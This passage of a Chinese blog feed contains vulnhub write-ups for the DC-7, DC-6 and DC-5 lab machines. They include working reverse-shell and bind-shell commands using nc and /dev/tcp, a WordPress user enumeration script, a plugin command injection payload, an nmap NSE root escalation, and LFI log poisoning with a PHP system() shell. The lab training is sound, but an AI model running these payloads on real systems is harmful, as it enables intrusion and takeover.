/home/dc7user/backups/website.sql<span class="token function">rm</span> /home/dc7user/backups/website.tar.gz<span class="token function">nc</span> <span class="token number">192.168</span>.0.21 <span class="token number">8899</span> <span class="token parameter variable">-e</span> /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>再开一个nc监听。过一会就得到root权限了</p></li><li><p><img src="/../static/dc-7/image-20200503173049525.png" alt="image-20200503173049525"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6靶机渗透</title>
      <link href="/dc-6/"/>
      <url>/dc-6/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-6靶机渗透"><a href="#DC-6靶机渗透" class="headerlink" title="DC-6靶机渗透"></a>DC-6靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><em>靶机提示信息</em><blockquote><p>  <em>~靶机介绍内容提取</em><br>  <strong>NOTE</strong> : You WILL need to edit your hosts file on your pentesting device so that it reads something like:<br>  <code>192.168.0.142wordy</code><br>  <strong>NOTE</strong> : I’ve used 192.168.0.142 as an example. You’ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.<br>  <strong>Clue</strong> : OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.<br>  <code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code><br>  That should save you a few years. ;-)<br>  <em>~中文翻译</em><br>  <strong>注</strong> : 您需要在攻击机上编辑主机文件，使其读取如下内容：<br>  <code>192.168.0.142wordy</code><br>  <strong>注</strong> : 我以192.168.0.142为例。您需要使用常规方法来确定VM的IP地址，并相应地进行调整。<br>  <strong>线索</strong> : 好吧，这并不是一个真正的线索，但更多的是一些“我们不想花五年时间等待某个过程完成”之类的建议，给那些只想继续工作的人。<br>  <code>cat/usr/share/wordlists/rockyou.txt | grep k01&gt;passwords.txt</code><br>  这样可以省你几年的时间。;-)</p></blockquote></li></ul><ul><li><p>所以这个靶机需要我们配置<code>hosts</code>文件</p></li><li><p>先把<code>IP</code>地址找出来：<code>netdiscover -r 192.168.0.1/24</code></p></li><li><p>找到<code>IP</code>地址为: <code>192.168.0.141</code></p></li><li><p>配<code>hosts</code>文件: <code>echo &#39;192.168.0.141        wordy&#39; &gt;&gt; /ectc/hosts</code></p></li><li><p>设置好了<code>ping</code> 一下试试…</p></li><li><p><code>namp</code> 扫一下端口 : <code>namp -sS -A -p- 192.168.0.141</code></p></li><li><p>扫描结果:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-04-26 <span class="token number">19</span>:51 CSTNmap scan report <span class="token keyword">for</span> wordy <span class="token punctuation">(</span><span class="token number">192.168</span>.0.141<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00028s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65533</span> closed portsPORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.4p1 Debian <span class="token number">10</span>+deb9u6 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey:<span class="token operator">|</span>   <span class="token number">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">41</span>:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span><span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.25 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span class="token operator">|</span>_http-generator: WordPress <span class="token number">5.1</span>.1<span class="token operator">|</span>_http-server-header: Apache/2.4.25 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: Wordy <span class="token operator">&amp;</span><span class="token comment">#8211; Just another WordPress site</span>MAC Address: 00:0C:29:B9:86:10 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">0.28</span> ms wordy <span class="token punctuation">(</span><span class="token number">192.168</span>.0.141<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开了<code>web</code>和<code>ssh</code></p></li><li><p>先看看<code>web</code></p></li><li><p>用<code>Wappalyzer</code>看到网站时 <code>WordPress</code>的框架</p></li><li><p>好说,之前做过的~知道默认的后台地址:<a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a></p></li><li><p>这里分享一个专门枚举<code>WordPress</code>用户名的<code>python</code>脚本:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># encoding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token punctuation">,</span>reheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">getAuthor</span><span class="token punctuation">(</span>_u<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> _u    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        geturl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?author=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">global</span> res            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>geturl<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                p <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;body class="archive author author-(.+?) author-'</span><span class="token punctuation">)</span>                matchs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    matchs <span class="token operator">=</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>                        matchs <span class="token operator">=</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">)</span>                        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'auth.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>                        <span class="token keyword">for</span> auth <span class="token keyword">in</span> matchs<span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[33m author: '</span> <span class="token operator">+</span> auth <span class="token operator">+</span> <span class="token string">'\033[0m'</span><span class="token punctuation">)</span>                            fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>auth <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>                            fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[32m [+] The results are saved in auth.txt. \033[0m'</span><span class="token punctuation">)</span>                            <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>                                _argv <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv                                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>_argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>                                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[31m [-] Please enter the URL to enumerate. \033[0m'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[35m template: ./author.py http://www.wordpress.com. \033[0m'</span><span class="token punctuation">)</span>                                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                                    getAuthor<span class="token punctuation">(</span>_argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>我们可以得到一个auth.txt的文件</p></li><li><p>用来做用户名的字典</p></li><li><p>还有上面线索说的:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat/usr/share/wordlists/rockyou.txt <span class="token operator">|</span> <span class="token function">grep</span> k0<span class="token operator"><span class="token file-descriptor important">1</span>></span>passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行这个可以得到一个密码字典</p></li><li><p>用<code>burpsuite</code>去给他爆破</p></li><li><p>然后就得到了一个账号和密码:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user:mark passwd:helpdesk01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>进后台之后</p></li><li><p>发现没啥权限</p></li><li><p>只能操作一个插件: <code>Activity</code></p></li><li><p>找想办法拿shell</p></li><li><p>先看看有没有框架漏洞 :<code>searchsploit wordpress Activity</code> </p></li><li><p>找到一些跨站脚本攻击和一个命令注入</p></li><li><p>这里我就用命令注入:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WordPress Plugin Plainview Activity Monitor <span class="token number">20161228</span> - <span class="token punctuation">(</span>Authenticated<span class="token punctuation">)</span> Command Injection <span class="token operator">|</span> exploits/php/webapps/45274.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>看了些<code>45274.html</code>这个文件说是在</p></li><li><p><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools%E9%A1%B5%E9%9D%A2%E4%B8%8B">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools页面下</a> </p></li><li><p>IP输入框存在命令注入 但是IP输入框的最大长度只有15,这时候可以抓包去改了</p></li><li><p>在参数填入 <code>0.0.0.0 | nc -lvp 6666 -e /bin/bash</code></p></li><li><p>然后kali用nc去连接就可以得到shell了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">192.168</span>.0.141 <span class="token number">6666</span> <span class="token comment">#nc连接</span><span class="token comment"># 获得交互式shell</span>python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>我们先看看有哪些用户 <code>cat /etc/passwd</code></p></li><li><p>发现4个自建用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">graham:x:1001:1001:Graham,,,:/home/graham:/bin/bashmark:x:1002:1002:Mark,,,:/home/mark:/bin/bashsarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bashjens:x:1004:1004:Jens,,,:/home/jens:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>去各自的用户目录下看看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-6:/var/www/html/wp-admin$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/jens<span class="token punctuation">;</span><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/sarah<span class="token punctuation">;</span><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/mark<span class="token punctuation">;</span><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/graham<span class="token operator">&lt;</span> <span class="token parameter variable">-l</span> /home/sarah<span class="token punctuation">;</span><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/mark<span class="token punctuation">;</span><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/grahamtotal <span class="token number">4</span>-rwxrwxr-x <span class="token number">1</span> jens devs <span class="token number">56</span> Apr <span class="token number">26</span> 00:01 backups.shtotal <span class="token number">0</span>total <span class="token number">4</span>drwxr-xr-x <span class="token number">2</span> mark mark <span class="token number">4096</span> Apr <span class="token number">26</span>  <span class="token number">2019</span> stufftotal <span class="token number">0</span><span class="token comment"># 看到jens下面有个backups.sh文件</span><span class="token comment"># mark有个stuff文件夹</span><span class="token builtin class-name">cd</span> /home/mark/stuff<span class="token punctuation">;</span><span class="token function">ls</span>things-to-do.txt<span class="token comment">#看到有个 things-to-do.txt 文件</span><span class="token function">cat</span> things-to-do.txtThings to do:- Restore full functionality <span class="token keyword">for</span> the hyperdrive <span class="token punctuation">(</span>need to speak to Jens<span class="token punctuation">)</span>- Buy present <span class="token keyword">for</span> Sarah<span class="token string">'s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah'</span>s replacement要做的事情：-恢复超光驱的全部功能（需要与Jens通话）-为莎拉的告别会买礼物-添加新用户：graham-GSo7isUM1D4——完成-申请OSCP课程-为莎拉的替代品购买新的笔记本电脑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找到graham的密码,并且开了22端口,我们用ssh登录试试</p></li><li><p>graham用户目录我们已经看了,啥也没有</p></li><li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>sudo -l</code></p></li><li><p>找到一条</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">User graham may run the following commands on dc-6:<span class="token punctuation">(</span>jens<span class="token punctuation">)</span> NOPASSWD: /home/jens/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>可以不要密码执行 <code>/home/jens/backups.sh</code></p></li><li><p>发现里面是打包网站的,我们让他去反弹一个shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.0.21/4444 0>&amp;1'</span> <span class="token operator">></span>  /home/jens/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>再去执行它</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> jens /home/jens/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>看看计划任务:<code>crontab -l</code>  &gt;&gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>history</code>  &gt;&gt;&gt;&gt;&gt;啥也没有</p></li><li><p>看看 <code>sudo -l</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">User jens may run the following commands on dc-6:<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>可以用以root的身份无密码执行nmap</p></li><li><p>nmap可以执行nse文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/bash")'</span> <span class="token operator">></span> /tmp/nmap.nse<span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span> /tmp/nmap.nse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>接着就得到了一个<code>rootshell</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@dc-6:/tmp<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token comment">#直接获得flag</span><span class="token function">cat</span> ~/<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">cd</span> ~<span class="token punctuation">;</span><span class="token function">ls</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>其实在网站配置文件里面还有数据库的账号密码…里面的密码太难了不会搞</p></li><li><p>找到了生成密码的文件,发现的每次都不一样,不知道怎么破解</p></li></ul><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#1. 网站后台账号密码:</span>user: mark passwd: helpdesk01<span class="token comment">#2. ssh账号密码:</span>user: grahampasswd: GSo7isUM1D4<span class="token comment">#3.数据库和账号密码：</span>user: wpdbuser passwd: meErKatZ DBName: wordpressdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-5靶机渗透</title>
      <link href="/dc-5/"/>
      <url>/dc-5/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-5靶机渗透"><a href="#DC-5靶机渗透" class="headerlink" title="DC-5靶机渗透"></a>DC-5靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1.渗透过程"></a>1.渗透过程</h2><ul><li><p>开始，扫描主机： <code>netdiscover -r 192.168.0.1/24</code></p></li><li><p>找到一个 <code>192.168.0.149   00:0c:29:cb:31:5f      1      60  VMware, Inc.</code></p></li><li><p>扫端口：<code>nmap -sS -A -p- 192.168.0.149</code></p></li><li><p>扫描结果：</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-04-26 <span class="token number">14</span>:36 CSTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.149Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0019s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65532</span> closed portsPORT      STATE SERVICE VERSION<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    nginx <span class="token number">1.6</span>.2<span class="token operator">|</span>_http-server-header: nginx/1.6.2<span class="token operator">|</span>_http-title: Welcome<span class="token number">111</span>/tcp   <span class="token function">open</span>  rpcbind <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span><span class="token operator">|</span> rpcinfo:<span class="token operator">|</span>   program version   port/proto  <span class="token function">service</span><span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/tcp  rpcbind<span class="token operator">|</span>   <span class="token number">100000</span>  <span class="token number">2,3</span>,4        <span class="token number">111</span>/udp  rpcbind<span class="token operator">|</span>   <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">38192</span>/tcp  status<span class="token operator">|</span>_  <span class="token number">100024</span>  <span class="token number">1</span>          <span class="token number">47477</span>/udp  status<span class="token number">38192</span>/tcp <span class="token function">open</span>  status  <span class="token number">1</span> <span class="token punctuation">(</span>RPC <span class="token comment">#100024)</span>MAC Address: 00:0C:29:CB:31:5F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只有开启了 <code>80 http 111:RPC 38192:RPC</code></p></li><li><p>在下载的时候看到的描述:</p></li></ul><blockquote><p>  As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.<br>  据我所知，只有一个可利用的入口点（也没有SSH）。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些不寻常的东西（随着页面刷新而改变的东西）。这将有希望提供一些关于脆弱性可能涉及到什么的想法。</p></blockquote><ul><li><p>我们需要寻找 &gt;&gt; <code>随着页面刷新而改变的东西</code></p></li><li><p>翻翻他的网页最后在 提交留言之后的页面 &gt;&gt;</p></li><li><p><a href="http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111">http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111</a></p></li><li><p>找到他的底部的 <code>Copyright © 2019</code></p></li><li><p>年份会变化,那也不知道哪里有漏洞啊</p></li><li><p>先给他爆破个目录:</p></li><li><p>然后爆出来:</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">200</span> OK-----http://192.168.0.149//index.php<span class="token number">200</span> OK-----http://192.168.0.149//contact.php<span class="token number">200</span> OK-----http://192.168.0.149//faq.php<span class="token number">200</span> OK-----http://192.168.0.149//footer.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>前面的几个都在页面上有的</p></li><li><p>我们去看看这个:<a href="http://192.168.0.149//footer.php">http://192.168.0.149//footer.php</a></p></li><li><p>内容和<code>thankyou.php</code>的底部一样的文字</p></li><li><p>刷新一下年份也会变化</p></li><li><p>那可能就是<code>thankyou.php</code>包含了<code>footer.php</code></p></li><li><p>先试试 <a href="http://192.168.0.149/thankyou.php?page=footer.php">http://192.168.0.149/thankyou.php?page=footer.php</a></p></li><li><p>没区别再试试<a href="http://192.168.0.149/thankyou.php?page=/etc/passwd">http://192.168.0.149/thankyou.php?page=/etc/passwd</a></p></li><li><p>也没啥区别,再试试 <a href="http://192.168.0.149/thankyou.php?file=/etc/passwd">http://192.168.0.149/thankyou.php?file=/etc/passwd</a></p></li><li><p>发现底部包含进来了!!!</p></li></ul><pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesystemd-network:x:101:104:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false systemd-resolve:x:102:105:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false Debian-exim:x:104:109::&#x2F;var&#x2F;spool&#x2F;exim4:&#x2F;bin&#x2F;false messagebus:x:105:110::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;falsestatd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;bin&#x2F;falsesshd:x:107:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologindc:x:1000:1000:dc,,,:&#x2F;home&#x2F;dc:&#x2F;bin&#x2F;bash mysql:x:108:113:MySQLServer,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>有<code>本地文件包含漏洞(LFI)</code> 好办了 ^_^</p></li><li><p>我们试试日志注入:</p></li><li><p>前面 <code>nmap</code> 扫出web服务器是 <code>nginx 1.6.2</code></p></li><li><p>然后 nginx默认的访问日志在: <code>/var/log/nginx/access.log</code></p></li><li><p>直接输入: <a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a> 验证一下</p></li><li><p>真包含进来了~ <strong>(ps:前面的爆破会产生大量日志内容,可能导致读不出内容,建议在爆破之前给靶机来个快照)</strong></p></li><li><p>我们直接用nc去连接他的80端口:</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~/workspace<span class="token comment"># nc 192.168.0.149 80</span><span class="token comment">#直接写一个直连的shellcode</span>GET <span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'nc -lvp 13123 -e /bin/bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span> HTTP/1.1<span class="token comment">#下面的自己生成的</span>HTTP/1.1 <span class="token number">400</span> Bad RequestServer: nginx/1.6.2Date: Sat, <span class="token number">25</span> Apr <span 